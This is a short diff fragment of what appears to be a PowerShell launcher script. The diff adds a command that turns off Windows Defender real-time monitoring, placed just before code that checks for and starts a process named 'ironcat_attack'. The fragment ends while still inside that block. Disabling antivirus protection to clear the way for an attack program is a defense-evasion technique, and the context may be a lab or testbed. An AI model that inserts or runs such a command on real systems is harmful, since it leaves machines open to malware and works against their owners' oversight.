@@ -1,3 +1,6 @@
+<# Disable Windows Defender #>
+Set-MpPreference -DisableRealtimeMonitoring $true
+
 <# Start Attack App #>
 $attackApp = Get-Process ironcat_attack
 if ( -not $attackApp ) {
